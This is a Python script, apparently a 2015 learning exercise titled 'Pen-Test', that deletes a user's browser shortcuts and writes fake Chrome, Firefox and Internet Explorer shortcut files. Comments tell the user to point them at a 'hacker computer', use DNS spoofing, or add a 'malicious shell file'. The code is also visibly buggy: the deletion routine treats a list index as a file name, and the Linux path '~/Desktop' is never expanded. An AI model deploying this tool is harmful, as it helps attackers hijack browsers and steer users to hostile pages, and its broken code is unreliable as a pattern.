#-------------------------------------------------------------------------------
# Name:        Pen-Test
# Purpose:     Familiarity with security and exploits
#
# Author:      Vasanth
#
# Created:     02/01/2015
# Copyright:   (c) Vasanth 2015
#-------------------------------------------------------------------------------
import os,time,platform
from subprocess import check_output,call

def desktop(): # switch the current directory to Desktop
    if "indow" in findOperatingSystem():
        defaultUsers=['All Users', 'Default', 'Default User', 'desktop.ini', 'Public','All Users', 'Default', 'Default User', 'desktop.ini', 'Public']
        os.chdir("C://Users/")
        users = os.listdir(os.curdir)
        for i in range(len(defaultUsers)):
            if(not(defaultUsers[i]==users[i])):
                os.chdir("C://Users/"+users[i])
                break
    elif "inux" in findOperatingSystem():
        os.chdir("~/Desktop")
    print("[*] Currently working in this directory: "+os.getcwd())

def niceGraphics():
    time.sleep(.3)
    print("[*] Loading "),
    for i in range(20):
        time.sleep(.1)
        print("."),

def executeChrome():
    if "Window" in findOperatingSystem():
        call('touch "Mozilla Firefox".URL', shell=True)
        check_output("echo [InternetShortcut] > \"%userprofile%\Desktop\Google Chrome.URL\"", shell=True)
        check_output("echo URL=http://www.google.com >> \"%userprofile%\Desktop\Google Chrome.URL\"", shell=True)# link to your computer or you can do a dns spoof to route chrome to hacker computer
        check_output("echo IconFile=http://www.google.com/favicon.ico >> \"%userprofile%\Desktop\Google Chrome.URL\"", shell=True)
        check_output("echo IconIndex=0 >> \"%userprofile%\Desktop\Google Chrome.URL\"", shell=True)
    elif "Linux" in findOperatingSystem():
        call('touch Chromium.desktop', shell=True)
        call('echo [Desktop Entry] > Chromium.desktop', shell=True)
        call('echo Version=1.0 >> Chromium.desktop', shell=True)
        call('echo Type=Link >> Chromium.desktop', shell=True)
        call('echo URL=http://www.google.com >> Chromium.desktop', shell=True)# link to your computer or you can do a dns spoof to route chrome to hacker computer
#       create a malicious shell file
#       if you want, create another link to connect to malicious file


def executeMozilla():
    if "Window" in findOperatingSystem():
        call('touch "Mozilla Firefox".URL', shell=True)
        check_output("echo [InternetShortcut] > \"Mozilla Firefox\".URL", shell=True)
        check_output("echo URL=http://www.google.com >> \"Mozilla Firefox\".URL", shell=True)# link to your computer or you can do a dns spoof to route chrome to hacker computer
        check_output("echo IconFile=http://www.google.com/favicon.ico >> \"Mozilla Firefox\".URL", shell=True)
        check_output("echo IconIndex=0 >> \"Mozilla Firefox\".URL", shell=True)
    elif "inux" in findOperatingSystem():
        call('touch "Mozilla Firefox".desktop', shell=True)
        call('echo [Desktop Entry] > "Mozilla Firefox".desktop', shell=True)
        call('echo Version=1.0 >> "Mozilla Firefox".desktop', shell=True)
        call('echo Type=Link >> "Mozilla Firefox".desktop', shell=True)
        call('echo URL=http://www.google.com >> "Mozilla Firefox".desktop', shell=True)# link to your computer or you can do a dns spoof to route chrome to hacker computer
#       create a malicious shell file
#       if you want, create another link to connect to malicious file


def executeIExplorer():
    if "Window" in findOperatingSystem():
        call('touch "Internet Explorer".URL', shell=True)
        check_output("echo [InternetShortcut] > \"%userprofile%\Desktop\Internet Explorer.URL\"", shell=True)
        check_output("echo URL=http://www.google.com >> \"%userprofile%\Desktop\Internet Explorer.URL\"", shell=True)# link to your computer or you can do a dns spoof to route chrome to hacker computer
        check_output("echo IconFile=http://www.google.com/favicon.ico >> \"%userprofile%\Desktop\Internet Explorer.URL\"", shell=True)
        check_output("echo IconIndex=0 >> \"%userprofile%\Desktop\Internet Explorer.URL\"", shell=True)
    elif "inux" in findOperatingSystem():
        call('touch "Internet Explorer".desktop', shell=True)
        call('echo [Desktop Entry] > "Internet Explorer".desktop', shell=True)
        call('echo Version=1.0 >> "Internet Explorer".desktop', shell=True)
        call('echo Type=Link >> "Internet Explorer".desktop', shell=True)
        call('echo URL=http://www.google.com >> "Internet Explorer".desktop', shell=True)# link to your computer or you can do a dns spoof to route chrome to hacker computer
#       create a malicious shell file
#       if you want, create another link to connect to malicious file

def removeShortcuts():
    filesInCurrentDir=os.listdir()
    for index in range(len(filesInCurrentDir)):
        if ("chrom" in index) or ("fox" in index) or ("nternet" in index):
            call('rm '+index, shell=True)
            print("[*] Deleted File: " + index)

def findOperatingSystem():
    return platform.system()

def main():
    desktop()
    removeShortcuts()
    niceGraphics()
    executeChrome()
    executeIExplorer()
    executeMozilla()



main()
